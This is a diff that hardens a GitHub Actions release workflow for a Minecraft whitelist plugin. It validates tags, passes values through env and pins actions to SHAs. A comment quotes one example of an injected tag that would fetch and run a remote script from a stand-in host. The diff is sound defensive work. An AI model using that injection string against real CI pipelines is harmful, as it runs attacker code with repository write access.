@@ -1,18 +1,26 @@
 name: Release
 
 # Publishes a GitHub Release with the shaded plugin JAR whenever a version tag
-# is pushed (e.g. `v3.0.0`). The tag drives the released version: it is passed
-# to Gradle as -Pversion, which flows into the jar name, plugin.yml,
+# is pushed (e.g. `v3.0.0`). The tag drives the released version: it is passed to
+# Gradle as -Pversion, which flows into the jar name, plugin.yml,
 # velocity-plugin.json and BuildConstants.VERSION, so the artifact version can
 # never drift from the tag.
 #
-# This is the download source the bot's /api/.../minecraft/plugin/latest
-# endpoint reads. The deployed v2 fleet's self-updater picks the first asset
-# ending in `.jar` that does not start with `original-`, so exactly one jar is
-# attached and its name is fixed as heimdall-whitelist-<version>.jar.
+# This is the download source the bot's /api/.../minecraft/plugin/latest endpoint
+# reads. The deployed v2 fleet's self-updater picks the first asset ending in
+# `.jar` that does not start with `original-`, so exactly one jar is attached and
+# its name is fixed as heimdall-whitelist-<version>.jar.
 #
 # Tag-triggered workflows run from the tagged commit, so the v2.x.x tags still
 # build with the Maven workflow that exists on their own commits.
+#
+# SECURITY: the tag name is attacker-controllable by anyone who can push a tag,
+# and this job holds contents:write. It is therefore never interpolated into a
+# `run:` body — `${{ }}` substitution happens before the shell sees the script,
+# so a tag like `v1.0.0$(curl evil.sh|sh)` would execute. Every ref-derived value
+# reaches the shell through `env:` and is quoted, and the version is gated
+# through a strict semver regex before anything else runs. Actions are pinned to
+# commit SHAs for the same reason: a mutable tag is someone else's decision.
 
 on:
   push:
@@ -25,41 +33,55 @@ jobs:
   release:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+
+      - name: Validate the tag and derive the version
+        id: ver
+        env:
+          TAG_NAME: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          version="${TAG_NAME#v}"
+          if ! printf '%s' "$version" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
+            echo "Refusing to release from tag '${TAG_NAME}': '${version}' is not a plain" >&2
+            echo "semver version. Expected v<major>.<minor>.<patch>[-prerelease]." >&2
+            exit 1
+          fi
+          echo "version=${version}" >> "$GITHUB_OUTPUT"
 
       - name: Set up JDK 21
-        uses: actions/setup-java@v4
+        uses: actions/setup-java@c1e323688fd81a25caa38c78aa6df2d33d3e20d9 # v4.8.0
         with:
           distribution: temurin
           java-version: "21"
 
       - name: Set up Gradle
-        uses: gradle/actions/setup-gradle@v4
-
-      - name: Derive version from tag
-        id: ver
-        run: echo "version=${GITHUB_REF_NAME#v}" >> "$GITHUB_OUTPUT"
+        uses: gradle/actions/setup-gradle@ed408507eac070d1f99cc633dbcf757c94c7933a # v4.4.3
 
       - name: Build
-        run: ./gradlew build -Pversion=${{ steps.ver.outputs.version }} --stacktrace
-
-      - name: Confirm the release asset exists
-        run: test -f "app/build/libs/heimdall-whitelist-${{ steps.ver.outputs.version }}.jar"
-
-      - name: Mark prerelease for -rc/-beta tags
-        id: pre
-        run: |
-          if [[ "${{ steps.ver.outputs.version }}" == *-* ]]; then
-            echo "flag=--prerelease" >> "$GITHUB_OUTPUT"
-          else
-            echo "flag=" >> "$GITHUB_OUTPUT"
-          fi
+        env:
+          VERSION: ${{ steps.ver.outputs.version }}
+        run: ./gradlew build -Pversion="$VERSION" --stacktrace
 
       - name: Create GitHub Release
         env:
           GH_TOKEN: ${{ github.token }}
+          TAG_NAME: ${{ github.ref_name }}
+          VERSION: ${{ steps.ver.outputs.version }}
         run: |
-          gh release create "${GITHUB_REF_NAME}" \
-            "app/build/libs/heimdall-whitelist-${{ steps.ver.outputs.version }}.jar" \
-            --title "Heimdall ${{ steps.ver.outputs.version }}" \
-            --generate-notes ${{ steps.pre.outputs.flag }}
+          set -euo pipefail
+          jar="app/build/libs/heimdall-whitelist-${VERSION}.jar"
+          # Fail here rather than publishing a release with a missing or
+          # wrongly-named asset, which would silently break the v2 self-updater.
+          if [ ! -f "$jar" ]; then
+            echo "Expected release asset not found: ${jar}" >&2
+            ls -la app/build/libs/ >&2 || true
+            exit 1
+          fi
+          prerelease=()
+          case "$VERSION" in
+            *-*) prerelease=(--prerelease) ;;
+          esac
+          gh release create "$TAG_NAME" "$jar" \
+            --title "Heimdall ${VERSION}" \
+            --generate-notes "${prerelease[@]}"
